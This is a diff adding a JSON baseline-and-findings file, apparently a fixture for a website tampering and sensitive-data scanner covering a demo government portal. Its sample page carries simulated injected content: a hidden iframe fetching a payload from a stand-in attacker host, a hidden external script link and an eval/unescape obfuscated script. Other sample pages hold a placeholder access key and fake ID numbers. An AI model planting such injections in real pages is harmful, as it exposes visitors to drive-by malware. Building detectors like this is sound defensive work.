@@ -1,0 +1,64 @@
+{
+  "baselines": {
+    "https://portal.example.gov.cn/": {
+      "content_hash": "773dae9134bd4be9f857b8c1c9db19743f55a284",
+      "text": "<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n  <meta charset=\"utf-8\">\n  <title>某单位门户网站</title>\n  <link rel=\"stylesheet\" href=\"/static/site.css\">\n</head>\n<body>\n  <h1>某单位门户网站</h1>\n  <nav>\n    <a href=\"/news.html\">新闻动态</a>\n    <a href=\"/about.html\">单位简介</a>\n  </nav>\n  <p>欢迎访问本单位门户网站，本站为演示用测试站点。</p>\n  <p>友情链接：<a href=\"https://www.gov.cn/\">中国政府网</a></p>\n  <p>合作单位：<a href=\"https://www.example.com/contact\">外部合作单位</a></p>\n  <!-- 以下两行为模拟被注入的挂马内容：隐藏 iframe + 外部恶意脚本 + 混淆代码 -->\n  <iframe width=\"0\" height=\"0\" src=\"https://evil.example.cc/payload?ref=portal\"></iframe>\n  <a href=\"https://badcdn.top/a.js\" style=\"display:none\">推广活动</a>\n  <script>eval(unescape('%61%6c%65%72%74%28%31%29'));</script>\n  <script src=\"/static/app.js\"></script>\n</body>\n</html>\n",
+      "links": [
+        "https://portal.example.gov.cn/about.html",
+        "https://portal.example.gov.cn/news.html"
+      ],
+      "updated_at": "2026-10-11T19:43:33+08:00"
+    },
+    "https://portal.example.gov.cn/about.html": {
+      "content_hash": "28af7b5d2b41dcc0d0063c7b2c3ff11d8f04901e",
+      "text": "<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n  <meta charset=\"utf-8\">\n  <title>单位简介 · 某单位门户网站</title>\n  <link rel=\"stylesheet\" href=\"/static/site.css\">\n</head>\n<body>\n  <h1>单位简介</h1>\n  <nav>\n    <a href=\"/index.html\">首页</a>\n    <a href=\"/news.html\">新闻动态</a>\n  </nav>\n  <p>本单位负责辖区内的公共服务与信息化建设工作。</p>\n  <p>办公地址：某市某区某路 1 号。</p>\n</body>\n</html>\n",
+      "links": [
+        "https://portal.example.gov.cn/index.html",
+        "https://portal.example.gov.cn/news.html"
+      ],
+      "updated_at": "2026-10-11T19:43:33+08:00"
+    },
+    "https://portal.example.gov.cn/news.html": {
+      "content_hash": "61ccc3c43b50baf31f7311c43e7cadb279232f61",
+      "text": "<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n  <meta charset=\"utf-8\">\n  <title>新闻动态 · 某单位门户网站</title>\n  <link rel=\"stylesheet\" href=\"/static/site.css\">\n</head>\n<body>\n  <h1>新闻动态</h1>\n  <nav>\n    <a href=\"/index.html\">首页</a>\n    <a href=\"/about.html\">单位简介</a>\n  </nav>\n  <p>2026 年 9 月，本单位完成年度信息化建设验收工作。</p>\n  <p>联系人：张某某，联系电话 13800000000（示例数据，已加入白名单）。</p>\n  <p>值班电话：13911112222。</p>\n  <p>统计报表下载：<a href=\"/files/statistics.csv\">2026 年第三季度统计报表</a></p>\n  <p>内部资料说明：本页部分内容仅供内部使用。</p>\n  <!-- 运维临时备注：access_key_id = AKIAIOSFODNN7EXAMPLE -->\n</body>\n</html>\n",
+      "links": [
+        "https://portal.example.gov.cn/about.html",
+        "https://portal.example.gov.cn/files/statistics.csv",
+        "https://portal.example.gov.cn/index.html"
+      ],
+      "updated_at": "2026-10-11T19:43:33+08:00"
+    },
+    "https://portal.example.gov.cn/files/statistics.csv": {
+      "content_hash": "75ce6cdda7449ef4f2a381ffbf457f88f43e1a1d",
+      "text": "序号,姓名,联系电话,身份证号,备注\n1,张某某,13911112222,11010119900307123X,统计口径说明\n2,李某某,13722223333,310101198812154321,参与调研\n",
+      "links": [],
+      "updated_at": "2026-10-11T19:43:33+08:00"
+    }
+  },
+  "false_positives": {},
+  "open_findings": {
+    "b89081243512a431": "敏感文件可公开访问：/backup.zip",
+    "cb9649b9be3a13c7": "敏感文件可公开访问：/config/database.yml",
+    "d76bdb4e097264d0": "混淆脚本：eval + 解码链",
+    "21ba14505341ce5f": "命中自定义敏感关键词：内部资料",
+    "855750bae76c4044": "命中自定义敏感关键词：仅供内部使用",
+    "6590a7d4c6cd9ddb": "命中敏感信息规则：中国大陆手机号",
+    "0736819846aea687": "命中敏感信息规则：AccessKeyId",
+    "79066686fbed99f8": "命中敏感信息规则：中国大陆手机号",
+    "3976d9b6e3f71b30": "命中敏感信息规则：身份证号",
+    "023a938faeeaebbb": "页面内容与基线不一致",
+    "4f1b0e8d15ecafd1": "页面引入未授权外部链接：badcdn.top",
+    "920f34fafc44ee01": "页面引入未授权外部链接：evil.example.cc",
+    "4be463d428b739d4": "隐藏 iframe（0 尺寸）",
+    "1d995982d58b3948": "隐藏元素（暗链特征）",
+    "a7229d2f233915e8": "CSP 缺失：content-security-policy",
+    "4d873ea9c7200b86": "HSTS 缺失：strict-transport-security",
+    "ca6c8b1c2a436268": "响应头泄露服务器版本",
+    "b4cc2e4c34434e5e": "响应头泄露服务器版本",
+    "e892a370bca0455b": "响应头泄露服务器版本",
+    "f992dfb1a8c9bc57": "响应头泄露服务器版本",
+    "f092c688bfa33531": "点击劫持防护头缺失：x-frame-options",
+    "34efd243fa2e108c": "MIME 嗅探防护头缺失：x-content-type-options",
+    "dab2f664233c9157": "Referrer-Policy 缺失：referrer-policy"
+  }
+}
